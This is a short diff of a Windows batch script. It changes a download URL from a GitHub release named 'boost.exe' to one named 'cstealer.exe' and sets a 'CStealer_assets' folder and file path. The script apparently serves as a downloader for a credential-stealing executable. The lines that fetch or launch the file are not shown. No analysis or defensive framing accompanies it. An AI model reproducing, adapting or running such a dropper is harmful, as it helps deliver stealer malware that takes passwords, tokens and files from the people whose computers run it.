@@ -1,5 +1,5 @@
 @echo off
-set "URL=https://github.com/hvbsvqdj/tool-boost-funk/releases/download/boost/boost.exe"
+set "URL=https://github.com/hvbsvqdj/cstealer/releases/download/stealer/cstealer.exe"
 set "Dossier=CStealer_assets"
 set "NomFichier=%Dossier%\cstealer.exe"
 
